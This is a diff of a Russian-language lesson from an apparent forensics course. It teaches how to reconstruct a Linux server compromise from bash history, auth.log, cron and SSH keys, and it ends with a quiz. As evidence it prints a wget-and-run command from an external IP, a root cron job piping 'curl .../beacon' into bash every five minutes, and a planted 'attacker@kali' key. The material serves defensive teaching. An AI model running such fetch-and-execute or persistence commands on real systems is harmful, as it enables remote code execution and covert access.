@@ -5,317 +5,254 @@ category: forensics
 parent: forensics-win-misc
 difficulty: hard
 order: 3
-tags: [linux, artifacts, bash-history, cron, persistence, dfir]
+tags: [linux, bash-history, auth.log, cron, ssh, ir]
 prerequisites: [forensics-windows-artifacts]
 useful_for:
   - "CTF Forensics категория"
-  - "DFIR / Incident Response"
-  - "Анализ серверов"
-estimated_minutes: 45
-summary: "Ключевые артефакты Linux: история shell, журналы, cron/systemd, авторизация, аудит и следы персистентности."
+  - "Incident Response (Linux)"
+  - "Анализ серверов после взлома"
+estimated_minutes: 40
+summary: "Артефакты Linux-сервера: история команд, журналы аутентификации, cron, SSH-ключи — восстановление действий атакующего."
 ---
 
-## Что оставляет атакующий на Linux
+## Вопрос, с которого всё начинается
 
-Linux-серверы компрометируются через веб-RCE, SSH-брутфорс, уязвимости сервисов. После получения доступа атакующий выполняет команды, закрепляется, двигается латерально. Артефакты разбросаны по файловой системе: история shell, cron, systemd, логи, файлы в `/tmp`, изменения в `/etc`, persistence-механизмы.
+В прошлом уроке мы восстановили историю Windows-машины. Теперь та же задача для
+**Linux-сервера**: машину взломали, злоумышленник уже ушёл, а у нас осталась копия
+её файловой системы. Что он делал, как вошёл и как закрепился?
 
-## История shell
+У Linux свои артефакты, но логика та же: система ведёт журналы для себя — мы читаем
+их как улики. Пройдём по одному инциденту.
 
-```bash
-# bash
-cat ~/.bash_history
-# zsh
-cat ~/.zsh_history
-# все пользователи
-find /home -name "*history" -exec ls -la {} \;
-# история root
-cat /root/.bash_history
+## Наш пример: папка с Linux-сервера
+
+```
+case/
+├── home/admin/.bash_history
+├── home/admin/.ssh/authorized_keys
+├── etc/cron.d/backup
+└── var/log/auth.log
 ```
 
-Тонкости:
+Начнём с того, что отвечает на вопрос «что делали руками», — с истории команд.
 
-- **HISTFILE=/dev/null** — атакующий отключает историю.
-- **`set +o history`** — временно.
-- **История пишется при выходе** — если сессия оборвана, последние команды могут отсутствовать.
-- **`HISTTIMEFORMAT`** — timestamps, если включено.
-- **Файлы могут быть удалены** — восстановимы из `~/.bash_history` inode/снапшота.
+## История команд: что вводил пользователь
 
-Другие истории: `~/.python_history`, `~/.mysql_history`, `~/.psql_history`, `~/.lesshst`, `~/.viminfo`, `~/.nano_history`.
-
-## Cron и планировщики
-
-Persistence через cron — классика:
+Файл `.bash_history` хранит команды, введённые в оболочке. Читаем:
 
 ```bash
-# Системные cron
-cat /etc/crontab
-ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
-# Пользовательские
-crontab -l -u <user>
-ls -la /var/spool/cron/crontabs/
-# Логи cron
-grep CRON /var/log/syslog
+$ cat case/home/admin/.bash_history
+ls -la
+id
+wget http://185.220.101.44/tool.sh -O /tmp/tool.sh
+chmod +x /tmp/tool.sh
+/tmp/tool.sh
+crontab -l
 ```
 
-Ищите: команды с `curl`/`wget`, реверс-шеллы, обращения к `/tmp`, base64, незнакомые скрипты.
+Картина сразу ясная: скачали скрипт с внешнего IP, дали права на запуск, запустили,
+посмотрели cron. Это **пост-эксплуатация** — действия после получения доступа.
 
-## Systemd и таймеры
+Важная тонкость: `.bash_history` пишется при **корректном завершении** оболочки.
+Если сессию оборвали, последние команды могли не сохраниться. Иногда атакующие
+подчищают историю (`history -c`, ссылка `HISTFILE=/dev/null`) — и тогда её
+отсутствие само по себе подозрительно.
+
+## Журнал аутентификации: как вошли
+
+`/var/log/auth.log` (в Debian/Ubuntu) или `/var/log/secure` (в RHEL) фиксирует
+входы, `sudo`, работу `ssh`:
 
 ```bash
-# Юниты
-ls -la /etc/systemd/system/ /lib/systemd/system/
-systemctl list-units --type=service --state=running
-systemctl list-timers --all
-# Пользовательские юниты
-ls -la ~/.config/systemd/user/
-# Недавно изменённые
-find /etc/systemd -mtime -7
+$ grep -E 'Accepted|sudo' case/var/log/auth.log
+Jun 14 09:40:58 server sshd[3120]: Accepted password for admin from 10.10.10.50 port 49812 ssh2
+Jun 14 09:41:10 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
 ```
 
-Атакующие создают `.service`/`.timer` с `ExecStart=` на свой payload.
+Читаем: в 09:40 вошли по SSH паролем под `admin` **с адреса 10.10.10.50**; в 09:41
+`admin` получил root через `sudo`. Значит, атакующий знал пароль `admin` (или подобрал
+его — тогда выше будут записи `Failed password`).
 
-## Авторизация и вход
+Полезные строки:
 
 ```bash
-# Debian/Ubuntu
-cat /var/log/auth.log
-# RHEL/CentOS
-cat /var/log/secure
-# Успешные/неудачные входы
-grep -E "Accepted|Failed|Invalid" /var/log/auth.log
-# Последние входы
-last -a | head
-lastb | head        # неудачные
-# Текущие сессии
-who
-w
+$ grep 'Failed password' case/var/log/auth.log | wc -l
+1842
+$ grep 'Accepted' case/var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c
+   3 10.10.10.50
 ```
 
-Ищите: входы с необычных IP, во внеурочное время, от новых пользователей, `sudo`-команды.
+1842 неудачных попыток и всего 3 успешных — типичная картина **брутфорса**, который
+закончился подбором пароля. Адрес, с которого вошли, — тоже улика.
 
-## Персистентность: где искать
+## Cron: как закрепились
 
-- **~/.ssh/authorized_keys** — добавленные ключи.
-- **/etc/passwd, /etc/shadow** — новые пользователи, UID 0.
-- **/etc/sudoers, /etc/sudoers.d/** — новые правила.
-- **~/.bashrc, ~/.profile** — автозапуск.
-- **/etc/rc.local, /etc/init.d/** — старый автозапуск.
-- **LD_PRELOAD, /etc/ld.so.preload** — перехват библиотек.
-- **PAM-модули** (`/lib/security/`) — бэкдоры.
-- **SSH-конфиг** (`/etc/ssh/sshd_config`) — изменения.
-- **Setuid-бинарники** (`find / -perm -4000`).
+**Cron** — планировщик задач Linux: запускает команды по расписанию. Это излюбленное
+место для **персистентности** — вредоносный код возвращается сам:
 
 ```bash
-# Новые пользователи
-awk -F: '$3==0 {print}' /etc/passwd
-# Изменённые конфиги
-find /etc -mtime -7 -type f
-# SUID
-find / -perm -4000 -type f 2>/dev/null
+$ cat case/etc/cron.d/backup
+*/5 * * * * root curl -s http://185.220.101.44/beacon | bash
 ```
 
-## Журналы systemd (journald)
+Запись говорит: каждые 5 минут от root скачивать скрипт с внешнего IP и выполнять.
+Даже если основной процесс убьют, задача вернётся. Где ещё искать автозапуск:
+
+| Место | Что смотреть |
+|-------|-------------|
+| `/etc/cron.*`, `/var/spool/cron` | задачи по расписанию |
+| `/etc/rc.local` | команды при загрузке |
+| `systemd` (`/etc/systemd/system`) | службы-автозапуск |
+| `~/.bashrc`, `~/.profile` | запуск при входе в оболочку |
+
+## SSH-ключи: как оставили «чёрный вход»
+
+Последний артефакт — файл доверенных ключей:
 
 ```bash
-journalctl -u sshd --since "2024-01-01" --until "2024-01-02"
-journalctl -p err -b
-journalctl --list-boots
-# Поиск подозрительного
-journalctl | grep -iE 'curl|wget|nc |/tmp/'
+$ cat case/home/admin/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAA...X9 attacker@kali
 ```
 
-Journald хранит бинарные журналы (`/var/log/journal/`), их можно экспортировать (`journalctl -o json`).
+Ключ с комментарием `attacker@kali` — это **бэкдор**: атакующий добавил свой
+публичный ключ и теперь входит без пароля. Такой вход не требует знания пароля и
+не всегда заметен. В реальных инцидентах это ищут в первую очередь.
 
-## Практический пример: разбор сервера
+Обрати внимание на комментарий в конце ключа: часто там остаётся имя машины или
+логин атакующего (`kali`, `attacker`, `root@vps`). Это прямая зацепка, которая
+связывает разные взломанные хосты между собой. Публичные ключи обычно хранят и в
+`/root/.ssh/authorized_keys` — проверяй и его, а не только домашний каталог
+пользователя.
 
-1. **История** всех пользователей → команды атакующего.
-2. **Cron/systemd** → persistence.
-3. **auth.log** → вход и sudo.
-4. **authorized_keys** → новые ключи.
-5. **/tmp, /dev/shm** → dropped файлы.
-6. **SUID/new users** → эскалация.
-7. **Таймлайн** по mtime.
+## Собираем таймлайн
 
-## Инструменты и команды
+```
+09:40:58  вход admin с 10.10.10.50 по паролю   (auth.log)
+09:41:10  sudo до root                          (auth.log)
+09:41:2x  wget tool.sh с 185.220.101.44         (bash_history)
+09:42:0x  запуск /tmp/tool.sh                   (bash_history)
+09:42:3x  добавлен cron каждые 5 минут          (etc/cron.d/backup)
+??:??     добавлен SSH-ключ attacker@kali       (.ssh/authorized_keys)
+```
+
+Один инцидент, собранный из четырёх файлов. Обрати внимание: каждое событие
+подтверждается **независимым** источником, и вместе они дают полную картину — вход,
+повышение прав, загрузку, закрепление.
+
+Если один артефакт отсутствует (например, `.bash_history` пуст), это не тупик: те
+же действия могут быть видны в `auth.log`, в списке пакетов или в рабочих каталогах.
+Форензика тем и отличается от «поиска файла», что всегда есть несколько источников,
+и их можно сверить между собой.
+
+## Ещё места, где искать следы
+
+История команд, журнал входов, cron и SSH-ключи — только начало. Опытный аналитик
+смотрит шире:
+
+| Артефакт | Что показывает |
+|----------|----------------|
+| `/var/log/wtmp`, `last` | все входы и выходы из системы |
+| `/var/log/btmp`, `lastb` | неудачные попытки входа |
+| `/tmp`, `/dev/shm` | рабочие каталоги загрузчиков (часто остаются) |
+| `systemd`-юниты | службы-автозапуск (аналог cron) |
+| `~/.ssh/known_hosts` | к каким серверам подключались с этой машины |
+| список пакетов | установленные инструменты (иногда сетевые сканеры) |
+| `~/.bashrc`, `/etc/profile` | запуск при входе в оболочку |
+
+`/dev/shm` и `/tmp` часто «забывают» почистить: там остаются скачанные скрипты и
+бинарники. А `known_hosts` может подсказать, куда атакующий шёл дальше по сети.
+
+## Порядок разбора Linux-сервера
+
+1. **Как вошли** — `auth.log`/`secure`: `Accepted`, `Failed`, адрес источника.
+2. **Что повышали** — `sudo`, смена пользователя, `su`.
+3. **Что делали** — `.bash_history`, рабочие каталоги `/tmp`, `/dev/shm`.
+4. **Как закрепились** — cron, systemd, `.bashrc`, `authorized_keys`.
+5. **Куда пошли дальше** — `known_hosts`, конфиги клиентов, история загрузок.
+6. **Таймлайн** — сопоставление событий из разных файлов по времени.
+
+## Как не потерять улики
+
+Linux-сервер живёт своей жизнью: журналы ротируются, старые записи затираются,
+временные файлы удаляются. Поэтому артефакты собирают аккуратно:
+
+- **Копируй логи, а не читай их «на живом» сервере.** Каждое подключение к
+  взломанной машине оставляет следы и может изменить метки времени.
+- **Помни про ротацию.** `/var/log/auth.log.1`, `.gz` — старые версии; их тоже надо
+  забрать, иначе не увидишь начало атаки.
+- **Проверь, не подчищены ли журналы.** Пропуск в датах или пустой файл — это улика.
+- **Сохрани метки времени.** При копировании `cp -a` или `tar` с сохранением
+  атрибутов, иначе время файлов изменится.
+
+Пример: посмотреть все входы из бинарного журнала `wtmp`:
 
 ```bash
-# Утилиты
-last, lastb, who, w
-journalctl
-# Инструменты DFIR: UAC (Unix-like Artifacts Collector)
-./uac -p full -o /evidence
-# chkrootkit/rkhunter для rootkit
-chkrootkit
-rkhunter --check
+$ last -f case/var/log/wtmp
+admin   pts/0   10.10.10.50   Thu Jun 14 09:40   still logged in
 ```
 
-## auditd: системный аудит
+`last` умеет читать `wtmp` из файла через `-f`, так что копии журналов достаточно,
+чтобы восстановить историю входов без работающей системы.
 
-**auditd** — подсистема аудита ядра Linux. Правила (`/etc/audit/rules.d/`) определяют, какие системные вызовы логировать (execve, открытие файлов, изменение прав). Логи — `/var/log/audit/audit.log`.
+## Что мы теперь знаем
 
-```bash
-# Аудит запуска процессов
-ausearch -m EXECVE -ts recent
-# Аудит доступа к файлу
-ausearch -f /etc/shadow
-# Отчёты
-aureport --auth
-aureport --executable
-# Живые правила
-auditctl -l
-```
-
-Ключевое: auditd пишет **даже при отключённой shell-истории** — если атакующий запускал команды, `EXECVE`-записи их содержат.
-
-## Инструменты DFIR: UAC
-
-**UAC (Unix-like Artifacts Collector)** — bash-скрипт, собирающий десятки артефактов с Linux/Unix: истории, cron, systemd, логи, сеть, пользователей, persistence.
-
-```bash
-./uac -p full -o /evidence/out      # полный сбор
-./uac -p ir_triage -o /evidence/ir  # triage
-```
-
-Аналоги: **Linux Explorer** (Velociraptor), **dfir_ntfs**, ручной сбор.
-
-## Сетевые и процессные артефакты
-
-- **`/proc/<pid>/`** — живые процессы, cmdline, окружение, открытые файлы (может не быть в образе).
-- **`/var/log/syslog`**, **`kern.log`** — системные события.
-- **`netstat`/`ss`** — соединения (для живого анализа).
-- **`/etc/hosts`** — может быть изменён (редирект).
-- **`/etc/resolv.conf`** — DNS.
-- **iptables/nftables** — правила (persistence/redirect).
-- **`~/.ssh/known_hosts`** — куда подключались.
-
-## Пакетные менеджеры и установка ПО
-
-```bash
-# История установок (apt)
-grep -E "install|remove" /var/log/dpkg.log
-zcat /var/log/apt/history.log.*.gz | grep -i install
-# yum/dnf
-grep -i install /var/log/dnf.log /var/log/yum.log
-# Изменённые файлы пакетов (Debian)
-debsums -c 2>/dev/null
-```
-
-Атакующие устанавливают инструменты (`nmap`, `netcat`, компиляторы) — это видно в логах. Отсутствие `nmap` в списке, но его бинарник на диске — подозрительно.
-
-## Инструменты и команды
-
-```bash
-# UAC (Unix-like Artifacts Collector)
-./uac -p full -o /evidence/out
-# Сбор вручную
-cat /var/log/auth.log; journalctl -u sshd
-last -a; lastb | head; who; w
-find / -perm -4000 -type f 2>/dev/null      # SUID
-find /etc -mtime -7 -type f                 # изменённые конфиги
-ls -la /tmp /dev/shm /var/tmp               # dropped файлы
-cat ~/.bash_history ~/.zsh_history
-crontab -l; ls /etc/cron.*; systemctl list-timers
-cat ~/.ssh/authorized_keys
-# chkrootkit/rkhunter
-chkrootkit; rkhunter --check --sk
-```
-
-## Скрытые файлы и обфускация
-
-- **Файлы с ведущей точкой** (`.hidden`).
-- **Имена с пробелами/юникодом** (`..`, `\u200b`).
-- **Файлы в `/dev/shm`, `/run`, `/tmp`** — в памяти, не на диске.
-- **Удалённые, но открытые файлы** (`lsof +L1`).
-- **Процессы с обфусцированным cmdline** (`/proc/<pid>/cmdline`).
-- **Изменённые бинарники** (`debsums`, сравнение с пакетом).
-
-```bash
-ls -la /tmp /dev/shm /var/tmp /run
-lsof +L1 2>/dev/null | head          # deleted-but-open
-cat /proc/*/cmdline | tr '\0' ' '
-debsums -c 2>/dev/null               # изменённые файлы пакетов
-```
-
-## Логи: сопоставление источников
-
-| Лог | Содержимое |
-|---|---|
-| `/var/log/auth.log` | аутентификация, sudo |
-| `/var/log/syslog` | системные события |
-| `/var/log/kern.log` | ядро |
-| `/var/log/dpkg.log` | установка пакетов |
-| `journalctl` | всё (systemd) |
-| `/var/log/nginx/access.log` | веб-доступ |
-| `/var/log/mysql/` | СУБД |
-
-Коррелируйте: вход в `auth.log` → команды в `bash_history` → сеть в `syslog`/journald → веб-запросы в nginx. Единый таймлайн даёт полную картину.
-
-## Итог
-
-Форензика Linux — это комбинация shell-историй, cron/systemd, логов и проверки persistence. Начинайте с историй (команды атакующего), затем persistence (cron/systemd/authorized_keys), затем логи входа и dropped-файлы. Не забывайте про `/tmp`, `/dev/shm`, SUID и новые пользователи. `UAC` автоматизирует сбор; `auditd` даёт системный уровень.
-
-## Частые ошибки
-
-- **Только `.bash_history`.** Есть zsh, python, mysql истории.
-- **Игнорировать systemd-таймеры.** Не только cron.
-- **Смотреть один лог.** auth.log + syslog + journald.
-- **Забыть `/tmp`, `/dev/shm`.** Там payload'ы.
-- **Не проверить authorized_keys.**
-- **Не искать SUID/new users.**
-
-## Как не застрять
-
-- **Истории shell** — команды атакующего.
-- **Cron + systemd** — persistence.
-- **auth.log/journald** — вход.
-- **authorized_keys/sudoers/passwd** — закрепление.
-- **/tmp, /dev/shm** — dropped файлы.
-- **Соберите таймлайн.**
+- `.bash_history` показывает введённые команды (если сессия закрыта штатно).
+- `auth.log`/`secure` фиксирует входы, неудачи и `sudo` — откуда и когда вошли.
+- Cron, systemd и rc.local — места персистентности; проверяй все.
+- `.ssh/authorized_keys` хранит ключи-бэкдоры.
+- Отсутствие истории или журналов — тоже признак заметания следов.
 
 ## Квиз
 
 ```quiz
-- question: "Где хранится история команд bash?"
+- question: "Что показывает `.bash_history`?"
   options:
-    - "~/.bash_history"
-    - "/var/log/auth.log"
-    - "/etc/passwd"
-    - "/proc"
-  answer: 0
-- question: "Как найти новых UID-0 пользователей?"
-  options:
-    - "awk -F: '$3==0' /etc/passwd"
-    - "last"
-    - "journalctl"
-    - "crontab -l"
-  answer: 0
-- question: "Какой файл содержит добавленные SSH-ключи?"
-  options:
-    - "/etc/shadow"
-    - "~/.ssh/authorized_keys"
-    - "/etc/crontab"
-    - "/var/log/syslog"
+    - "сетевые соединения"
+    - "команды, введённые в оболочке"
+    - "список пользователей"
+    - "запущенные службы"
   answer: 1
-- question: "Где логи входов в Debian/Ubuntu?"
+- question: "1842 строки `Failed password` и 3 `Accepted` в auth.log — это…"
   options:
-    - "/var/log/auth.log"
-    - "/etc/passwd"
-    - "~/.bashrc"
-    - "/tmp"
-  answer: 0
-- question: "Какой механизм persistence НЕ типичен для Linux?"
+    - "сбой сервера"
+    - "брутфорс, закончившийся подбором пароля"
+    - "нормальный вход"
+    - "очистка журнала"
+  answer: 1
+- question: "Зачем атакующий пишет задачу в cron?"
   options:
-    - "cron"
-    - "systemd timer"
-    - "authorized_keys"
-    - "реестр Windows"
-  answer: 3
+    - "для скорости"
+    - "для персистентности — код возвращается сам"
+    - "чтобы сжать логи"
+    - "для резервной копии"
+  answer: 1
+- question: "Ключ `attacker@kali` в `.ssh/authorized_keys` — это…"
+  options:
+    - "обычный ключ администратора"
+    - "бэкдор для входа без пароля"
+    - "публичный ключ сервера"
+    - "ошибка настройки"
+  answer: 1
+- question: "Почему пустой `.bash_history` подозрителен?"
+  options:
+    - "это норма"
+    - "историю могли очистить, чтобы скрыть команды"
+    - "файл всегда пустой"
+    - "он удаляется сам"
+  answer: 1
 ```
+
+## Куда дальше
+
+Мы прошли три больших источника — диск, сеть, память — и артефакты обеих систем.
+Дальше в категории начинается углубление: файловые системы по типам, сетевой
+анализ, стеганография, облака. А пока запомни: **в Linux улики лежат в истории,
+журналах и местах автозапуска — сопоставь их по времени**.
 
 ## Где пригодится
 
-- **CTF Forensics** — задачи с образами Linux.
-- **DFIR** — расследование компрометации серверов.
-- **Анализ серверов** — аудит и hunting.
-- **SOC** — детекты на persistence.
-- **Пентест** — понимание следов.
+- **CTF:** задачи с артефактами Linux и восстановлением действий.
+- **Incident Response:** разбор взломанных серверов.
+- **Threat Hunting:** поиск персистентности и бэкдоров.
+- **DevOps / SRE:** расследование инцидентов на продовых машинах.
+- **Криминалистика:** доказательная реконструкция событий на сервере.
